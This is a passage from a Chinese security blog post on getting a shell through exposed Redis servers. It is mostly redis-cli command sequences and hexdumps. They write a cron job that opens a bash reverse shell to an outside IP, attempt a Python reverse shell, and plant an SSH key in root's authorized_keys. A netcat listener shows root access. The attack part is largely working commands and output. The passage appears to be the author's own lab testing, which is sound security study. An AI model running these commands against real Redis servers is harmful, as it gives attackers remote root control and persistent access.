<span class="number">3356 6672</span> <span class="number">4956 6f50</span>  /A6SEYv23VfrIVoP</div><div class="line"><span class="number">00000060</span>: <span class="number">644</span>f <span class="number">4342 5644</span> <span class="number">3938</span> <span class="number">4</span>f2b <span class="number">5245 7856</span> <span class="number">5743</span>  dOCBVD98O+RExVWC</div><div class="line"><span class="number">00000070</span>: <span class="number">6538</span> <span class="number">496</span>b <span class="number">6e77 7a78</span> <span class="number">3377 3148</span> <span class="number">6d32 7557</span>  e8Iknwzx3w1Hm2uW</div><div class="line"><span class="number">00000080</span>: <span class="number">6e42 3669</span> <span class="number">3641 7443</span> <span class="number">6e49 6a69</span> <span class="number">3379 7a31</span>  nB6i6AtCnIji3yz1</div><div class="line"><span class="number">00000090</span>: <span class="number">3648 4950</span> <span class="number">7279</span> <span class="number">7</span>a6f <span class="number">4c45 3635</span> <span class="number">784</span>e <span class="number">345</span>a  <span class="number">6</span>HIPryzoLE65xN4Z</div><div class="line"><span class="number">000000a0</span>: <span class="number">3276 4758</span> <span class="number">5</span>a6b <span class="number">3259</span> <span class="number">6d</span>4f <span class="number">7552 7471</span> <span class="number">4650</span>  <span class="number">2</span>vGXZk2YmOuRtqFP</div><div class="line"><span class="number">000000b0</span>: <span class="number">4</span>b50 <span class="number">6</span>b2f <span class="number">5143 6466</span> <span class="number">3156 7868</span> <span class="number">366</span>c <span class="number">774</span>c  KPk/QCdf1Vxh6lwL</div><div class="line"><span class="number">000000c0</span>: <span class="number">5a52 6f32</span> <span class="number">6d73 5945</span> <span class="number">4</span>b2f <span class="number">2</span>b6d <span class="number">7a69 4f72</span>  ZRo2msYEK/+mziOr</div><div class="line"><span class="number">000000d0</span>: <span class="number">6d59 7931</span> <span class="number">557</span>a <span class="number">7771 4c78</span> <span class="number">666</span>c <span class="number">3175 4e59</span>  mYy1UzwqLxfl1uNY</div><div class="line"><span class="number">000000e0</span>: <span class="number">5659 5473</span> <span class="number">326</span>a <span class="number">4847 4245</span> <span class="number">696</span>b <span class="number">5077 4137</span>  VYTs2jHGBEikPwA7</div><div class="line"><span class="number">000000f0</span>: <span class="number">4641 7435</span> <span class="number">5a56 5252</span> <span class="number">4268 7a44</span> <span class="number">6</span>e6e <span class="number">3864</span>  FAt5ZVRRBhzDnn8d</div><div class="line"><span class="number">00000100</span>: <span class="number">7954 3230</span> <span class="number">3146 4f77</span> <span class="number">522</span>f <span class="number">6670</span> <span class="number">756</span>b <span class="number">6958</span>  yT201FOwR/fpukiX</div><div class="line"><span class="number">00000110</span>: <span class="number">6261 6576</span> <span class="number">5</span>a55 <span class="number">322</span>f <span class="number">6979</span> <span class="number">572</span>b <span class="number">5175 3973</span>  baevZU2/iyW+Qu9s</div><div class="line"><span class="number">00000120</span>: <span class="number">7361</span> <span class="number">5</span>a4d <span class="number">4</span>a4d <span class="number">7052 7a61</span> <span class="number">7574 4e75</span> <span class="number">5</span>a4c  saZMJMpRzautNuZL</div><div class="line"><span class="number">00000130</span>: <span class="number">7843 6d56</span> <span class="number">3954 6675</span> <span class="number">5030 4e62</span> <span class="number">7367 4342</span>  xCmV9TfuP0NbsgCB</div><div class="line"><span class="number">00000140</span>: <span class="number">486</span>a <span class="number">316</span>e <span class="number">4</span>f4d <span class="number">6633 4255</span> <span class="number">514</span>e <span class="number">5855 7445</span>  Hj1nOMf3BUQNXUtE</div><div class="line"><span class="number">00000150</span>: <span class="number">3461 4352</span> <span class="number">5030 6748</span> <span class="number">6273 3138</span> <span class="number">5776 7078</span>  <span class="number">4</span>aCRP0gHbs18Wvpx</div><div class="line"><span class="number">00000160</span>: <span class="number">3572 7957</span> <span class="number">796</span>c <span class="number">2</span>f4e <span class="number">5757 5141</span> <span class="number">444</span>f <span class="number">5932</span>  <span class="number">5</span>ryWyl/NWWQADOY2</div><div class="line"><span class="number">00000170</span>: <span class="number">644d</span> <span class="number">484d</span> <span class="number">5775 5474</span> <span class="number">4378 4c53</span> <span class="number">7266</span> <span class="number">592</span>f  dMHMWuTtCxLSrfY/</div><div class="line"><span class="number">00000180</span>: <span class="number">712</span>b <span class="number">4838</span> <span class="number">6</span>c2b <span class="number">4a47 6451</span> <span class="number">7077</span> <span class="number">3d</span>3d <span class="number">0</span>a0a  q+H8l+JGdQpw==..</div><div class="line"><span class="number">00000190</span>: ff17 <span class="number">7956</span> a743 a92c <span class="number">3</span>f                   ..yV.C.,?</div></pre></td></tr></table></figure>
+<p>成功连入了，有效</p>
+<h1 id="centos"><a class="headerlink" href="#centos" title="centos"></a>centos</h1><p>这里我首先使用了centos7下的实体机来测试。</p>
+<p>先写入<br/><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">root@edward ~]# redis-<span class="keyword">cli</span> </div><div class="line">redis <span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>:<span class="number">6379</span>&gt; set <span class="number">1</span> <span class="string">"\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/115.28.78.16/12345 0&gt;&amp;1\n"</span></div><div class="line">OK</div><div class="line">redis <span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>:<span class="number">6379</span>&gt; config set dir /var/spool/cron</div><div class="line">OK</div><div class="line">redis <span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>:<span class="number">6379</span>&gt; config set dbfilename root</div><div class="line">OK</div><div class="line">redis <span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>:<span class="number">6379</span>&gt; save</div><div class="line">OK</div></pre></td></tr></table></figure></p>
+<p>然后看看内容</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[root@edward cron]# xxd root</div><div class="line"><span class="number">0000000</span>: <span class="number">5245 4449</span> <span class="number">5330 3030</span> <span class="number">32</span>fe <span class="number">0000</span> c001 <span class="number">3</span>e0a  REDIS0002.....&gt;.</div><div class="line"><span class="number">0000010</span>: <span class="number">2</span>a2f <span class="number">3120 2a20</span> <span class="number">2a20 2a20</span> <span class="number">2a20 2f62</span> <span class="number">696</span>e  */<span class="number">1</span> * * * * /bin</div><div class="line"><span class="number">0000020</span>: <span class="number">2f62 6173</span> <span class="number">6820 2d69</span> <span class="number">203</span>e <span class="number">2620 2f64</span> <span class="number">6576</span>  /bash -i &gt;&amp; /dev</div><div class="line"><span class="number">0000030</span>: <span class="number">2f74 6370</span> <span class="number">2f31 3135</span> <span class="number">2</span>e32 <span class="number">382</span>e <span class="number">3738 2e31</span>  /tcp/<span class="number">115.28.78.1</span></div><div class="line"><span class="number">0000040</span>: <span class="number">362</span>f <span class="number">3132 3334</span> <span class="number">3520</span> <span class="number">303</span>e <span class="number">2631</span> <span class="number">0</span>aff       <span class="number">6/12345 0</span>&gt;&amp;<span class="number">1</span>..</div></pre></td></tr></table></figure>
+<p>成功了</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root<span class="variable">@iZ285ei82c1Z:</span>~# nc -l -p <span class="number">12345</span></div><div class="line"><span class="attribute">bash</span>: no job control in this shell</div><div class="line">[root<span class="variable">@edward</span> ~]# whoami</div><div class="line">whoami</div><div class="line">root</div></pre></td></tr></table></figure>
+<p>试试python的</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">redis 127.0.0.1:6379&gt; <span class="keyword">set</span> 1 "*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os,sys;s=socket</div><div class="line">OK</div><div class="line">redis 127.0.0.1:6379&gt; config <span class="keyword">set</span> <span class="keyword">dir</span> /<span class="keyword">var</span>/spool/cron</div><div class="line">OK</div><div class="line">redis 127.0.0.1:6379&gt; config <span class="keyword">set</span> dbfilename root</div><div class="line">OK</div><div class="line">redis 127.0.0.1:6379&gt; <span class="keyword">save</span></div><div class="line">OK</div></pre></td></tr></table></figure>
+<p>好像还是被截断了<br/><figure class="highlight dns"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">[root@edward cron]# xxd root </div><div class="line"><span class="number">0000000</span>: <span class="number">5245 4449</span> <span class="number">5330 3030</span> <span class="number">32</span>fe <span class="number">0000</span> c001 c340  REDIS0002......@</div><div class="line"><span class="number">0000010</span>: c840 ff05 <span class="number">0</span>a2a <span class="number">2</span>f31 <span class="number">202</span>a a001 <span class="number">1</span>f2f <span class="number">7573</span>  .@...*/<span class="number">1</span> *.../us</div><div class="line"><span class="number">0000020</span>: <span class="number">722</span>f <span class="number">6269</span> <span class="number">6</span>e2f <span class="number">7079 7468</span> <span class="number">6</span>f6e <span class="number">202d</span> <span class="number">6320</span>  r/bin/python -c </div><div class="line"><span class="number">0000030</span>: <span class="number">2769 6d70</span> <span class="number">6f72 7420</span> <span class="number">736</span>f <span class="number">636</span>b <span class="number">6515</span> <span class="number">742</span>c  'import socke.t,</div><div class="line"><span class="number">0000040</span>: <span class="number">7375 6270</span> <span class="number">726</span>f <span class="number">6365 7373</span> <span class="number">2</span>c6f <span class="number">732</span>c <span class="number">7379</span>  subprocess,os,sy</div><div class="line"><span class="number">0000050</span>: <span class="number">733</span>b <span class="number">733d</span> <span class="number">801</span>a <span class="number">002</span>e <span class="number">8006 0028</span> <span class="number">8006</span> <span class="number">082</span>e  s<span class="comment">;s=.......(....</span></div><div class="line"><span class="number">0000060</span>: <span class="number">4146 5f49</span> <span class="number">4</span>e45 <span class="number">542</span>c a00e <span class="number">1f53 4f43</span> <span class="number">4</span>b5f  AF_INET,...SOCK_</div><div class="line"><span class="number">0000070</span>: <span class="number">5354 5245</span> <span class="number">414d</span> <span class="number">293</span>b <span class="number">732</span>e <span class="number">636</span>f <span class="number">6</span>e6e <span class="number">6563</span>  STREAM)<span class="comment">;s.connec</span></div><div class="line"><span class="number">0000080</span>: <span class="number">7428 2822</span> <span class="number">3131</span> <span class="number">352</span>e <span class="number">3238 2e07</span> <span class="number">3738 2e31</span>  t(("<span class="number">115</span>.<span class="number">28</span>..<span class="number">78</span>.<span class="number">1</span></div><div class="line"><span class="number">0000090</span>: <span class="number">3622 2c36</span> <span class="number">2000 1929</span> <span class="number">293</span>b <span class="number">6f73 2e64</span> <span class="number">7570</span>  <span class="number">6</span>",<span class="number">6</span> ..))<span class="comment">;os.dup</span></div><div class="line"><span class="number">00000a0</span>: <span class="number">3228</span> <span class="number">732</span>e <span class="number">6669 6c65</span> <span class="number">6</span>e6f <span class="number">2829 2c30</span> <span class="number">293</span>b  <span class="number">2</span>(s.fileno(),<span class="number">0</span>)<span class="comment">;</span></div><div class="line"><span class="number">00000b0</span>: <span class="number">20e0 0a16</span> <span class="number">0031</span> e00d <span class="number">1604 3229</span> <span class="number">3</span>b70 <span class="number">3d</span>e0   ....<span class="number">1</span>....<span class="number">2</span>)<span class="comment">;p=.</span></div><div class="line"><span class="number">00000c0</span>: <span class="number">01</span>ab <span class="number">072</span>e <span class="number">6361</span> <span class="number">6</span>c6c <span class="number">285</span>b <span class="number">2260</span> db0c <span class="number">7368</span>  ....call(["`..sh</div><div class="line"><span class="number">00000d0</span>: <span class="number">222</span>c <span class="number">222d</span> <span class="number">6922 5d29</span> <span class="number">3</span>b27 <span class="number">0</span>aff            ","-i"])<span class="comment">;'..</span></div></pre></td></tr></table></figure></p>
+<p>当然也没有被执行。</p>
+<p>最后我们尝试写入公钥的方式</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">redis <span class="number">127.0.0.1</span>:<span class="number">6379</span>&gt; OMf3BUQNXUtE4aCRP0gHbs18Wvpx5ryWyl/NWWQADOY2dMHMWuTtCxLSrfY/q+H8l+JGdQpw==\n\n"</div><div class="line">OK</div><div class="line">redis <span class="number">127.0.0.1</span>:<span class="number">6379</span>&gt; config set dir /root/.ssh</div><div class="line">OK</div><div class="line">redis <span class="number">127.0.0.1</span>:<span class="number">6379</span>&gt; config set dbfilename authorized_keys</div><div class="line">OK</div><div class="line">redis <span class="number">127.0.0.1</span>:<span class="number">6379</span>&gt; save</div><div class="line">OK</div></pre></td></tr></table></figure>
+<p>成功了</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[root@edward .ssh]# xxd authorized_keys </div><div class="line"><span class="number">0000000</span>: <span class="number">5245 4449</span> <span class="number">5330 3030</span> <span class="number">32</span>fe <span class="number">0000</span> c<span class="number">001 4180</span>  REDIS0002.....<span class="keyword">A</span>.</div><div class="line"><span class="number">0000010</span>: <span class="number">0</span>a0a <span class="number">7373</span> <span class="number">682d</span> <span class="number">7273 6120</span> <span class="number">4141 4141</span> <span class="number">4233</span>  ..ssh-rsa AAAAB3</div><div class="line"><span class="number">0000020</span>: <span class="number">4</span>e7a <span class="number">6143 3179</span> <span class="number">6332 4541</span> <span class="number">4141 4142</span> <span class="number">4977</span>  NzaC1yc2EAAAABIw</div><div class="line"><span class="number">0000030</span>: <span class="number">4141 4151</span> <span class="number">4541</span> <span class="number">734</span>a <span class="number">3470</span> <span class="number">626</span>a <span class="number">584</span>c <span class="number">354</span>b  AAAQEAsJ4pbjXL5K</div><div class="line"><span class="number">0000040</span>: <span class="number">6</span>e6e <span class="number">582</span>f <span class="number">4650 3673</span> <span class="number">5</span>a4f <span class="number">5261 5433</span> <span class="number">4</span>e38  nnX/FP6sZORaT3N8</div><div class="line"><span class="number">0000050</span>: <span class="number">2f41 3653</span> <span class="number">4559 7632</span> <span class="number">3356 6672</span> <span class="number">4956 6f50</span>  /A6SEYv23VfrIVoP</div></pre></td></tr></table></figure>
+</div>
+</div>
+<div class="copyright">
+<p><span>本文标题:</span><a href="/2016/12/03/redis-getshell/">通过redis getshell的一些小问题</a></p>
+<p><span>文章作者:</span><a href="/" title="回到主页">LoRexxar</a></p>
+<p><span>发布时间:</span>2016-12-03, 16:08:53</p>
+<p><span>最后更新:</span>2016-12-05, 21:13:22</p>
+<p>
+<span>原始链接:</span><a class="post-url" href="/2016/12/03/redis-getshell/" title="通过redis getshell的一些小问题">http://lorexxar.cn/2016/12/03/redis-getshell/</a>
+<span class="copy-path" data-clipboard-text="原文: http://lorexxar.cn/2016/12/03/redis-getshell/　　作者: LoRexxar" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+<script> var clipboard = new Clipboard('.copy-path'); </script>
+</p>
+<p>
+<span>许可协议:</span><i class="fa fa-creative-commons"></i> <a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" rel="license" target="_blank" title="CC BY-NC-SA 4.0 International">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+</div>
+<nav id="article-nav">
+<div class="article-nav-title" id="article-nav-newer">
+<a href="/2016/12/07/polyglot-JPEGs-bypass-csp/">
+                    using polyglot JPEGs bypass CSP 分析
+                </a>
+</div>
+<div class="article-nav-title" id="article-nav-older">
+<a href="/2016/12/01/hctf2016-other/">
+                    hctf2016 简单部分WEB &amp;&amp; misc writeup
+                </a>
+</div>
+</nav>
+</article>
+<div class="toc-article" id="toc">
+<strong class="toc-title">文章目录</strong>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ubuntu系统"><span class="toc-number">1.</span> <span class="toc-text">ubuntu系统</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#crontab方式"><span class="toc-number">1.1.</span> <span class="toc-text">crontab方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#通过写入authorized-keys-getshell"><span class="toc-number">1.2.</span> <span class="toc-text">通过写入authorized_keys getshell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#centos"><span class="toc-number">2.</span> <span class="toc-text">centos</span></a></li></ol>
+</div>
+<style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+<input id="tocButton" title="点击按钮隐藏或者显示文章目录" type="button" value="隐藏目录"/>
+<script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+<div class="share">
+<div class="bdsharebuttonbox">
+<a class="fa fa-twitter bds_twi" data-cmd="twi" href="#" title="分享到推特"></a>
+<a class="fa fa-weibo bds_tsina" data-cmd="tsina" href="#" title="分享到新浪微博"></a>
+<a class="fa fa-qq bds_sqq" data-cmd="sqq" href="#" title="分享给 QQ 好友"></a>
+<a class="fa fa-files-o bds_copy" data-cmd="copy" href="#" title="复制网址"></a>
+<a class="fa fa fa-envelope-o bds_mail" data-cmd="mail" href="#" title="通过邮件分享"></a>
+<a class="fa fa-weixin bds_weixin" data-cmd="weixin" href="#" title="生成文章二维码"></a>
+<a class="fa fa-share-alt bds_more" data-cmd="more" href="#"></a></div></div></div></div></div></body></html>
+
+<script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"通过redis getshell的一些小问题　| LoRexxar's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+
+<section class="youyan" id="comments">
+<script>
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = 'http://v2.uyan.cc/code/uyan.js?uid=2127998';
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+<script> loadComment(); </script>
+<div id="uyan_frame"></div>
+</section>
+<div class="scroll" id="post-nav-button">
+<a href="/2016/12/07/polyglot-JPEGs-bypass-csp/" title="上一篇: using polyglot JPEGs bypass CSP 分析">
+<i class="fa fa-angle-left"></i>
+</a>
+<a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+<a href="/2016/12/01/hctf2016-other/" title="下一篇: hctf2016 简单部分WEB &amp;&amp; misc writeup">
+<i class="fa fa-angle-right"></i>
+</a>
+</div>
+<ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/05/16/nonce-bypass-script/">通过浏览器缓存来bypass CSP script nonce</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/12/pppctf2017/">PlaidCTF 2017 web writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/12/xss-bot2/">xss bot从入门到弃坑</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/09/CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy/">CSP Is Dead, Long Live CSP! 翻译</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/24/pwnhub-jue/">pwnhub 绝对防御 出题思路和反思</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/21/Shadow-Brokers/">Shadow Brokers大新闻整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/21/360chunqiu2017/">360春秋杯2017 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/18/bctf2017-web/">bctf2017 web部分wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/27/pwnhub-xiaom/">pwnhub 之小m的复仇</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/21/0ctf2017-web/">0ctf201 web部分writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/13/njctf2017-wp/">NJCTF Web部分writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/05/pwnhub-another-php/">pwnhub_another php web部分</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/27/zctf2017-writeup/">zctf2017 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/20/pwnhub-open/">pwnhub 打开电脑</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/16/cdn-bypass-csp/">有趣的cdn bypass CSP</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/26/hctf2016-something/">聊聊hctf2016</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/17/pwnhub-shen/">pwnhub 深入敌后</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/03/33c3-wp/">33c32016 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/28/cve-2016-10030/">phpmailer RCE漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/26/pwnhub_mi/">pwnhub_迷</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/24/xss-protect/">浅谈xss的后台守护问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/18/pwnhub-pai2/">pwnhub_拍卖行</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/18/pwnhub-pai/">pwnhub_找朋友</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/10/pwnhub-WTF-writeup/">pwnhub_WTF_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/07/polyglot-JPEGs-bypass-csp/">using polyglot JPEGs bypass CSP 分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/03/redis-getshell/">通过redis getshell的一些小问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/01/hctf2016-other/">hctf2016 简单部分WEB &amp;&amp; misc writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/30/hctf2016-xss/">hctf2016 guestbook&amp;secret; area writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/29/hctf2016-ATField/">HCTF2016 ATField writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/19/web2-giligili/">hctf2016 giligili writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/31/csp-then2/">CSP进阶-302 Bypass CSP</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/28/csp-then/">CSP进阶-link Bypass unsafe line</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/26/ctf-start/">什么是ctf呢？</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/11/hitcon2016-misc/">hitcon2016 misc writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/10/hitcon2016/">hitcon2016 web writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/03/Lctf2016/">L-ctf2016 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/14/php-wei/">php 伪协议</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/11/huashanbei2016/">华山杯2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/29/crypto-start/">crypto 简单的RSA</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/18/sqlmap-source4/">sqlmap 源码分析（四）开始注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/16/sqlmap-source3/">sqlmap 源码分析（三）在注入之前</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/11/sqlmap-source2/">sqlmap 源码分析（二）初始化</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/09/sqlmap-source1/">sqlmap 源码分析（一）开始、参数解析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/08/ccsp/">CSP Level 3浅析&amp;简单的bypass</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/07/python-virtualenv/">python virtualenv沙盒命令</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/01/xnuca-ctf-wp/">XNUCA2016 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/21/python-tqdm/">python tqdm模块分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/18/cmd-shell/">shell上一些有趣的命令</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/17/sangebaimao_huobi/">sangebaimao之火币网</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/12/guosai-ctf-wp/">信息安全国赛技能赛 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/26/cloudeye/">一个有趣的东西-cloudeye</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/17/sangebaimao-zhao/">sangebaimao之招聘又开始了，你怕了吗？</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/06/alictf2016/">alictf2016_web_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/04/sangebaimao1/">sangebaimao 寻找来自星星的你一</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/27/opcache-jcfx/">在php opcache检测隐藏的后门程序</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/12/php-shell/">php webshell 各种函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/10/asis-bcloud/">Asis2016_Binary Cloud</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/09/sctf2016/">sctf2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/05/dockerfile/">dockerfile  (・ω・)ノ</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/04/docker-jc/">docker 基础操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/02/ggctf2016/">google_ctf2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/25/cctf2016/">CCTF2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/20/gif-ccsp/">gif bypass CSP?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/11/j123jt-wp/">j123jt的聊天板大型wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/11/sctf-Obfusion/">sctfq1_Obfusion_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/08/input-bypasscsrf/">input属性bypass csp</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/06/hctfgame-llfx/">hctfgame_ll的流量分析题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/04/phpblack/">is_numeric和trim导致的判断绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/30/web-for-pentest-II/">web_for_pentest_II writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/22/bctf2016/">bctf2016</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/hctfgame_week4+5_writeup/">hctf_game_week4+5_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/0ctf2016/">0ctf2016 &amp;&amp; sunshinectf2016 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/07/bkp2016-writeup/">bkp2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/05/hexo-coding/">hexo转移到coding配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/01/ssctf2015-writeup/">ssctf2015_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/29/hctfgame_week3_writeup/">hctf_game_week3_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/28/ldpai/">ldpa简单注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/28/titan-souls-ez/">titan souls 普通模式通关攻略</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/18/easy_git/">简单的git教程</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/18/hctfgame_week2_writeup/">hctf_game_week2_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/18/hctfgame_week1_writeup/">hctf_game_week1_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/18/hctfgame_week0_writeup/">hctf_game_week0_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/21/dmsj-book/">《代码审计》一点儿笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/19/hctf2015/">hctf2015的一点儿记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/19/xss-link/">xss link&amp;svg;黑魔法</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/19/sql-error/">SQL 显错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/17/rctf2015/">RCTF2015_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/17/isg2015/">ISG2015_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/02/hsb/">SPWC &amp; 华山杯？ writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/24/sqli_h/">关于sqli注入的特殊函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/04/XDCTF2015-writeup/">XDCTF2015-writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/09/28/nsctf-writeup/">Nsctf2015_Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/02/xss-p/">xss无声挑战赛_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/06/11/ctf0611/">ctf近期总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/05/22/Hexo-blogs/">Windows Hexo博客安装配置优化（小白篇）</a></li><li class="post-list-item"><a class="post-list-link" 